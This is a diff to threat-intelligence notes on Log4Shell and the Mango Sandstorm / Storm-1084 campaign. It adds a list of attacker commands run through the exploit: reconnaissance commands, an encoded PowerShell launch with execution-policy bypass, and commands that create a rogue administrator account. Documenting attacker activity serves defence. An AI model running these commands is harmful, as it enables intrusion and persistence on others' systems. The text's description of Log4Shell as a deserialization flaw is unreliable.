@@ -17,7 +17,18 @@ Log4j is a widely used Java logging library that allows developers to log events
 #### Why was Log4j 2 exploited ?
 Log4j 2, an updated version of Log4j, is a widely used and powerful logging framework in Java. However, it had a critical vulnerability called Log4Shell (CVE-2021-44228, CVE-2021-45046, CVE-2021-44832), ***which allowed attackers to remotely execute code by exploiting its deserialization functionality.*** Regarding the details of Log4j 2, you can refer to [Guidance for preventing, detecting, and hunting for exploitation of the Log4j 2 vulnerability](https://www.microsoft.com/en-us/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/).
 
-
+#### What commands were executed through the Log4j 2 exploit?
+```cmd
+cmd.exe /C whoami
+cmd.exe /C powershell -exec bypass -w 1 -enc UwB….
+cmd.exe /C hostname
+cmd.exe /C ipconfig /all
+cmd.exe /C net user
+cmd.exe /C net localgroup administrators
+cmd.exe /C net user admin * /add
+cmd.exe /C net localgroup Administrators admin /add
+cmd.exe /C quser
+```
 
 ## April 7, 2023, Mango Sandstorm & Storm-1084
 Mango Sandstorm, previously known for using Log4j 2 exploits and targeting on-premises environments, has now expanded its focus to include both on-premises and cloud environments. After gaining initial access through known vulnerabilities, the attack has been linked to Storm-1084 (formerly known as DEV-1084).
